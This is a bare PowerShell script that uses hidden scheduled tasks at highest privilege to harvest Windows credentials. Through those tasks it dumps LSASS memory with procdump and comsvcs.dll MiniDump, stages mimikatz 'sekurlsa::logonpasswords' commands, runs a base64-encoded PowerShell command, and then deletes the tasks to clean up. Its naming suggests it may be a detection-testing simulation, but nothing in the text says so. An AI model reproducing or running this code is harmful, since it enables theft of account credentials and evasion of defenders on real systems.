$prefix = "S1E_$([Guid]::NewGuid().ToString('N').Substring(0,8))"
$tasks = @()

$psCmd = 'Get-Process lsass | Select-Object Id,ProcessName,Path | Out-File C:\Windows\Temp\lsass_info.txt'
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psCmd))

$t1 = "${prefix}_PD"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t1`" /TR `"cmd.exe /c procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $t1
Start-Sleep -Milliseconds 500

$t2 = "${prefix}_MK"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t2`" /TR `"cmd.exe /c echo privilege::debug sekurlsa::logonpasswords exit > C:\Windows\Temp\mk.log`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $t2
Start-Sleep -Milliseconds 500

$t3 = "${prefix}_CS"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t3`" /TR `"cmd.exe /c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 0 C:\Windows\Temp\lsass.dmp full`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $t3
Start-Sleep -Milliseconds 500

$t4 = "${prefix}_EP"
Start-Process "schtasks.exe" -ArgumentList "/Create /TN `"$t4`" /TR `"powershell.exe -EncodedCommand $encoded -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden`" /SC ONCE /ST 23:59 /F /RL HIGHEST" -WindowStyle Hidden -Wait
$tasks += $t4

Write-Output "Created $($tasks.Count) credential harvesting tasks"
foreach ($t in $tasks) {
    Start-Process "schtasks.exe" -ArgumentList "/Delete /TN `"$t`" /F" -WindowStyle Hidden -Wait
}
Write-Output "All tasks cleaned up"
